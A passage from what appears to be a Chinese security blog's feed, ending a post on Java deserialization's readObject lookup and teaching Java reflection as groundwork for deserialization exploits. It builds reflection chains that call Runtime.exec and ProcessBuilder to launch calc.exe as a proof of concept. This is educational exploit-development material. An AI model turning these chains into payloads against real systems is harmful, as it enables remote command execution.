class="keyword">static</span> Method <span class="title">getPrivateMethod</span><span class="params">(Class&lt;?&gt; cl, String name,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       Class&lt;?&gt;[] argTypes,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       Class&lt;?&gt; returnType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//获取class user中名为name：readObject字符串，并且接受参数类型为ObjectInputStream.class的方法</span></span><br><span class="line">        Method meth = cl.getDeclaredMethod(name, argTypes);</span><br><span class="line">        <span class="comment">//开放访问限制</span></span><br><span class="line">        meth.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取该方法的修饰符</span></span><br><span class="line">        <span class="keyword">int</span> mods = meth.getModifiers();</span><br><span class="line">        <span class="keyword">return</span> ((meth.getReturnType() == returnType) &amp;&amp;<span class="comment">//该方法的返回类型需要为void</span></span><br><span class="line">                ((mods &amp; Modifier.STATIC) == <span class="number">0</span>) &amp;&amp;<span class="comment">//该方法不能有Static修饰类型</span></span><br><span class="line">                ((mods &amp; Modifier.PRIVATE) != <span class="number">0</span>)) ? meth : <span class="keyword">null</span>;<span class="comment">//该方法需要是private的，满足所有条件，返回这个方法</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么通过<code>getPrivateMethod</code>函数的判定，只有满足以下条件的方法，readObjectMethod才会被赋值（即，readObject才会被赋值，即进入复写的世界线，执行被复写的参数）：</p><ul><li>方法名为readObject</li><li>返回类型为void</li><li>传入参数为一个ObjectInputStream.class类型参数</li><li>修饰符不能包含static</li><li>修饰符必须包含private</li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>至此我们从源码彻底搞清楚了readObject为什么会形成复写，</p><p>这不是java设计导致的漏洞，而是本身的设计就是允许readObject复写，甚至详细制定了判定何种参数设定会解析为readObject复写</p><p>那么就产生了几个疑问:</p><ol><li><strong>一直以来java反序列化漏洞频出，为什么java要支持readObject复写？</strong></li></ol><p>因为类的实例序列化，不会将static变量和transient变量序列化，如果我们需要序列化这些变量就需要复写readObject函数，像下面这样：</p><p>(01) 通过writeObject()方法，写入要保存的变量。writeObject的原始定义是在ObjectOutputStream.java中，我们按照如下示例覆盖即可：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException</span>&#123; </span><br><span class="line">    out.defaultWriteObject();<span class="comment">// 使定制的writeObject()方法可以利用自动序列化中内置的逻辑。 </span></span><br><span class="line">    out.writeInt(ival);      <span class="comment">// 若要保存“int类型的值”，则使用writeInt()</span></span><br><span class="line">    out.writeObject(obj);    <span class="comment">// 若要保存“Object对象”，则使用writeObject()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>(02) 通过readObject()方法，读取之前保存的变量。readObject的原始定义是在ObjectInputStream.java中，我们按照如下示例覆盖即可：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123; </span><br><span class="line">    in.defaultReadObject();       <span class="comment">// 使定制的readObject()方法可以利用自动序列化中内置的逻辑。 </span></span><br><span class="line">    <span class="keyword">int</span> ival = in.readInt();      <span class="comment">// 若要读取“int类型的值”，则使用readInt()</span></span><br><span class="line">    Object obj = in.readObject(); <span class="comment">// 若要读取“Object对象”，则使用readObject()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol start="2"><li><strong>为什么要规定传参，规定private修饰，void返回类型呢？</strong></li></ol><p>emmm，一个很微妙的问题，可能有为啥，可能….就是没有为啥，一个规范吧。目前母鸡，也没想去多深究了。</p><p>最后，在网上看到:</p><blockquote><p>readObject方法根本就不能被重写，因为原本的readObject方法被申明为final，该类型的方法不能被重写</p></blockquote><p>我们从源码上分析来说，这种说法应该是正确的，我们并没有重写readObject，而是执行了一个自定义的全新函数，但是也不知道用词汇去修正这个形容，我们全文也还是再说readObject复写，自己清楚就好。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.smi1e.top/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%9f%ba%e7%a1%80/" target="_blank" rel="noopener">https://www.smi1e.top/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%9f%ba%e7%a1%80/</a><br>解决为何复写函数需要private属性和ObjectInputStream作为参数：<br><a href="https://xz.aliyun.com/t/4761" target="_blank" rel="noopener">膜大佬</a><br><a href="https://www.cnblogs.com/sharkli/p/5607895.html" target="_blank" rel="noopener">膜程序员</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文主要分成四部分&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;java序列化与反序列化的正常使用&lt;/li&gt;
&lt;li&gt;java反序列化readObject是如
      
    
    </summary>
    
    
      <category term="web" scheme="http://lalajun.com/tags/web/"/>
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
      <category term="java反序列化" scheme="http://lalajun.com/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>java反射机制</title>
    <link href="http://lalajun.com/2019/08/19/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <id>http://lalajun.com/2019/08/19/java反射机制/</id>
    <published>2019-08-19T09:05:28.000Z</published>
    <updated>2019-12-30T02:35:42.255Z</updated>
    
    <content type="html"><![CDATA[<h2 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h2><p>真正反序列化漏洞的利用，还需要了解java反射原理。因为java反序列化的payload大多与反射机制密切相关。</p><p>在Java中的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法；并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。<br>让java可以在运行时，根据传入的类名字符串，去执行这个类存在的方法等。</p><p>一个不使用反射机制的例子：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">fruit</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;  </span><br><span class="line">&#125;  </span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span> <span class="keyword">implements</span> <span class="title">fruit</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"Apple"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Orange</span> <span class="keyword">implements</span> <span class="title">fruit</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"Orange"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">    </span><br><span class="line"><span class="comment">// 构造工厂类  </span></span><br><span class="line"><span class="comment">// 也就是说以后如果我们在添加其他的实例的时候只需要修改工厂类就行了  </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Factory</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> fruit <span class="title">getInstance</span><span class="params">(String fruitName)</span></span>&#123;  </span><br><span class="line">        fruit f=<span class="keyword">null</span>;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"Apple"</span>.equals(fruitName))&#123;  </span><br><span class="line">            f=<span class="keyword">new</span> Apple();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"Orange"</span>.equals(fruitName))&#123;  </span><br><span class="line">            f=<span class="keyword">new</span> Orange();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> f;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] a)</span></span>&#123;  </span><br><span class="line">        fruit f=Factory.getInstance(<span class="string">"Orange"</span>);  </span><br><span class="line">        f.eat();  </span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果我们想要添加新的水果，就需要</p><ul><li>添加新的水果类</li><li>修改Factory</li><li>在main函数中使用新的水果类</li></ul><p>修改为反射机制的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">fruit</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span> <span class="keyword">implements</span> <span class="title">fruit</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"Apple"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Orange</span> <span class="keyword">implements</span> <span class="title">fruit</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"Orange"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Factory</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> fruit <span class="title">getInstance</span><span class="params">(String ClassName)</span></span>&#123;  </span><br><span class="line">        fruit f=<span class="keyword">null</span>;  </span><br><span class="line">        <span class="keyword">try</span>&#123;  </span><br><span class="line">            f=(fruit)Class.forName(ClassName).newInstance();  </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> f;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] a)</span></span>&#123;  </span><br><span class="line">        fruit f=Factory.getInstance(<span class="string">"Reflect.Apple"</span>);  </span><br><span class="line">        <span class="keyword">if</span>(f!=<span class="keyword">null</span>)&#123;  </span><br><span class="line">            f.eat();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这时候如果我们需要添加水果，只需要</p><ul><li>添加水果类</li><li>在main函数中使用新的水果类即可</li></ul><p>那么好像可以看出一点问题，如果传入的类名可控，再加上一些办法，那就不是可以调用任意类，去运行系统命令了呢。</p><h3 id="反射机制的方法"><a href="#反射机制的方法" class="headerlink" title="反射机制的方法"></a>反射机制的方法</h3><p>列出在实际利用中重要的方法例子：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class clazz = Class.forName(className);    </span><br><span class="line">    clazz.getMethod(methodName).invoke(clazz.newInstance()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>឴获取类：<strong>forName</strong></li><li>获取类下的函数：<strong>getMethod</strong></li><li>执行类下的函数：<strong>invoke</strong></li><li>实例化类的对象：<strong>newInstance</strong></li></ul><p>以下一步步使用反射机制实现<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code>这个语句</p><ul><li>getRuntime():其实就是Runtime类获取对象的方式，等于new一个Runtime类。之所以封装成一个函数是为了不调用一次建立一个对象，只获取一个对象来执行操作。</li><li>exec():调用exec函数</li><li>calc.exe：调用计算器程序</li></ul><p>反射机制的执行顺序跟直接调用有些差别，一步步来</p><h4 id="forName"><a href="#forName" class="headerlink" title="forName"></a>forName</h4><p>获得一个class对象(<strong>java.lang.Class</strong>)有三种方法：</p><ol><li><code>obj.getClass()</code>:如果上下文中存在某个类的实例obj，那么我们可以直接通过<code>obj.getClass()</code>来获取它的类。<ol><li>假如obj是实例：获取该实例的class（如Runtime.getRuntime().getClass()结果就是class java.lang.Runtime类）（此处类的意思实际上时class这个类的对象）</li><li>假如obj是类：获取到java.lang.Class类（class这个类的对象）</li></ol></li><li><code>Test.class</code>:Test是一个已经加载的类，想获取它的java.lang.Class对象，直接拿取class参数即可。（这不是反射机制）</li><li><code>Class.forName</code>:如果知道类的名字，可以直接使用forname来获取。</li></ol><p>forName两种使用形式<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; forName(String name) </span><br><span class="line"><span class="comment">//name:class名称</span></span><br><span class="line">Class&lt;?&gt; forName(String name, **<span class="keyword">boolean</span>** initialize, ClassLoader loader)</span><br><span class="line"><span class="comment">//name:class名称</span></span><br><span class="line"><span class="comment">//initialize：是否进行“类初始化”</span></span><br><span class="line"><span class="comment">//loader：加载器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一种调用形式等同于第二种，其实就是第二种形式的封装，默认进行"类初始化”，默认加载器根据类名（完整路径）来加载</span></span><br><span class="line">Class.forName(className) </span><br><span class="line">Class.forName(className, <span class="keyword">true</span>, currentLoader)</span><br></pre></td></tr></table></figure></p><p><strong>类初始化</strong>：<br>类初始化不等于类的实例化，举个例子：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainPrint</span> </span>&#123;</span><br><span class="line">    <span class="comment">//初始块</span></span><br><span class="line">    &#123;        </span><br><span class="line">        System.out.printf(<span class="string">"Empty block initial %s\n"</span>, <span class="keyword">this</span>.getClass());    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//静态初始块</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">            System.out.printf(<span class="string">"Static initial %s\n"</span>, TrainPrint.class);    </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrainPrint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.printf(<span class="string">"Initial %s\n"</span>, <span class="keyword">this</span>.getClass());</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    Class.forName(<span class="string">"TrainPrint"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Static initial class TrainPrint</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">   TrainPrint test= <span class="keyword">new</span> TrainPrint();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Static initial class TrainPrint</span></span><br><span class="line"><span class="comment">// Empty block initial class TrainPrint</span></span><br><span class="line"><span class="comment">// Initial class TrainPrint</span></span><br></pre></td></tr></table></figure><p>类的实例化：<code>静态初始块</code>-&gt;<code>初始块</code>-&gt;<code>构造函数</code><br>类的初始化：<code>静态初始块</code></p><p>具有父类的类的实例化：<code>父类静态初始块</code>-&gt;<code>子类静态初始块</code>-&gt;<code>父类初始块</code>-&gt;<code>父类构造函数</code>-&gt;<code>子类初始块</code>-&gt;<code>子类构造函数</code><br>具有父类的类的实例化：<code>父类静态初始块</code>-&gt;<code>子类静态初始块</code></p><blockquote><p>以上对于类初始化的说明其实就是说，单独一个Class.forName(),在类静态初始块可控的情况下，可以执行恶意代码。</p></blockquote><p><strong>调用内部类</strong>:<br>Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： C1.class 和 C1$C2.class，我们可以把他们看作两个无关的类。<br><code>Class.forName(&quot;C1$C2&quot;)</code>可以调用这个内部类。</p><p>我们可以通过<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>来获取类（java.lang.Runtime是Runtime类的完整路径）</p><h4 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h4><p>getMethod 的作用是通过反射获取一个类的某个特定的<strong>公有</strong>方法。<br>而Java中支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要传给他你需要获取的函数的参数类型列表，如下：<br><code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class)</code></p><h4 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h4><p>invoke方法位于Method类下，其的作用是传入参数，执行方法，<br><code>public Object invoke(Object obj, Object... args)</code><br>它的第一个参数是执行method的对象：</p><ul><li>如果这个方法是一个普通方法，那么第一个参数是类对象 </li><li>如果这个方法是一个静态方法，那么第一个参数是类（之后会提到，这里其实不用那么死板，这个）<br>它接下来的参数才是需要传入的参数。</li></ul><p>由于我们的exec函数是一个普通方法，需要传入类对象，即<code>invoke(类对象，exec方法传入的参数)</code><br>之前说到Runtime的类对象不能通过newInstance()来获取对象（class.newInstance等于new class）,是因为Runtime的类构造函数是一个private构造函数，只能通过getRuntime方法返回一个对象。<br>获取类对象：<code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))</code> (由于getRuntime是一个静态方法，invoke传入Runtime类，进行调用)<br><code>invoke(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))，&quot;calc.exe&quot;)</code></p><p>那么合成以上的操作：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>, String.class).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))，<span class="string">"calc.exe"</span>)</span><br></pre></td></tr></table></figure></p><p>亲测可弹框,再简化一下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>); </span><br><span class="line">clazz.getMethod(<span class="string">"exec"</span>, String.class).invoke(clazz.getMethod(<span class="string">"getRuntime"</span>).invoke(clazz), <span class="string">"calc.exe"</span>);</span><br></pre></td></tr></table></figure></p><p>以上我们就完成了通过类内置的静态方法获取类的实例，进一步调用一个public方法。<br>但是假如一个类没有无参构造方法（即不能class.newInstance()），也没有单例模式（只存在一个实例）的静态方法（即不能像getRuntime一样获取实例），那我们该如何实例化这个类呢？</p><h3 id="指定的构造方法生成类的实例"><a href="#指定的构造方法生成类的实例" class="headerlink" title="指定的构造方法生成类的实例"></a>指定的构造方法生成类的实例</h3><p>继续举一个演化成反射机制的执行命令payload的例子：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; paramList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">paramList.add(<span class="string">"calc.exe"</span>);</span><br><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(paramList);</span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure></p><p>可见，其构造函数是写入了一个字符串，不是无参构造方法，接下来我们会一步步进行转化。</p><p><code>getConsturctor()</code>函数可以选定指定接口格式的构造函数(由于构造函数也可以根据参数来进行重载)，即：<code>getConsturctor(参数类型)</code></p><p>选定后我们可以通过newInstance(),并传入构造函数的参数执行构造函数，即<code>newInstance(传入的构造函数参数)</code>。</p><p>ProcessBuilder有两个构造函数：</p><ul><li><code>public ProcessBuilder(List&lt;String&gt; command)</code></li><li><code>public ProcessBuilder(String... command)</code>(此处，String<code>...</code>这种语法表示String参数数量是可变的，与String[]一样)<br>分别执行构造方法获取实例的语句如下：</li><li><code>Class.forName(&quot;java.lang.ProcessBuilder&quot;).getConstructor(String.class).newInstance(&quot;calc.exe&quot;))</code></li><li><code>Class.forName(&quot;java.lang.ProcessBuilder&quot;).getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;)))</code></li></ul><p>执行完构造方法获取实例之后，其实可以通过类型强制转化，进而执行start()函数，进行执行命令。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>); </span><br><span class="line">( (ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">"calc.exe"</span>)) ).start();</span><br></pre></td></tr></table></figure></p><p>但实际情况下并不一定可以这样利用，所以继续使用反射机制调用start函数,start函数不是一个静态函数,需要传入类的实例：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>); </span><br><span class="line">clazz.getMethod(<span class="string">"start"</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">"calc.exe"</span>)));</span><br></pre></td></tr></table></figure></p><p>亲测成功</p><p>另一种形式的构造函数的反射转换：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(<span class="string">"calc.exe"</span>);<span class="comment">//这个可以传入多个字符串</span></span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure></p><p>因为ProcessBuilder构造函数传入的参数其实不是一个字符串String.class类型，而是一个变长的字符串数组String[].class，所以我们应该如下调用。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>); </span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[]&#123;<span class="string">"calc.exe"</span>&#125;)).start();</span><br></pre></td></tr></table></figure></p><p>但是实际上我们这样调用是会报错的，因为newInstance函数接受参数是一个<code>Object..</code>也就是Object数组，它会完美契合我们提供的String[]，剥去一层数组。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g667bkzna5j31k413twjf.jpg" alt></p><p>来看看之前的List形式构造函数的形式：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g667by6gs9j31k10kzmyz.jpg" alt></p><p>可见少了一层，List传入会被当做Object的第一项，而String[]传入，会直接被当作Object。<br>所以我们需要再加一层[]：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>); </span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">"calc.exe"</span>&#125;&#125;)).start();</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g667c63emdj30wc099aaw.jpg" alt></p><p>亲测可弹计算器。</p><h3 id="执行私有方法"><a href="#执行私有方法" class="headerlink" title="执行私有方法"></a>执行私有方法</h3><p>以上都是方法或构造方法是public函数，但是如果是私有方法，我们该如何调用？<br>之前我们用的都是getMethod、getConstructor，接下来需要使用getDeclaredMethod、getDeclaredConstructor：</p><ul><li>getMethod等方法获取的是当前类中所有公共方法，包括从父类继承的方法 </li><li>getDeclared等方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了</li></ul><p>之前说到Runtime的构造方式是一个私有方法，从而不能直接调用，那么接下来我们来调用Runtime的构造方法来获取一个实例来执行calc.exe：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>); </span><br><span class="line">Constructor m = clazz.getDeclaredConstructor(); </span><br><span class="line">m.setAccessible(<span class="keyword">true</span>); </span><br><span class="line">clazz.getMethod(<span class="string">"exec"</span>, String.class).invoke(m.newInstance(), <span class="string">"calc.exe"</span>);</span><br></pre></td></tr></table></figure></p><p>在获取到私有方法后，通过<code>setAccessible(true)</code>可以打破私有方法访问限制，从而进行调用。<br>getDeclaredMethod、getDeclaredConstructor和getMethod、getConstructor使用方法是一致的，就不赘述了。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>那么我们已经通过反射机制，调用任意类的任意方法了。<br>具体的函数说明表格可以参考<a href="https://www.jianshu.com/p/9be58ee20dee" target="_blank" 